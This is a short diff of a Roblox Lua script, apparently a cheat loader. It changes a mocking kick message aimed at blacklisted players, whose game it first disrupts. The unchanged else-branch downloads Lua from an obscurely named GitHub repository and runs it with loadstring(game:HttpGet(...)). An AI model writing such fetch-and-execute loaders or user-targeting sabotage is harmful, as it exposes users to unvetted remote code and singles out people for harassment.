@@ -24,7 +24,7 @@ if isBlacklisted then
   game.Workspace.TPSSystem.TPS.Size = Vector3.new(99, 99, 99)
  wait(4)
  local player = Players.LocalPlayer
-   player:Kick("EL GUION BRO JAJAJAJAJ, REMEMBER ME???")
+   player:Kick("EL GUION BRO JAJAJAJAJ, REMEMBER ME???JAJAJJA")
 else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIIlIIIl42344LLLIlIlIl321dOV2llIl/8798787KSFSDFSD/refs/heads/main/Mobile.lua"))()
 end
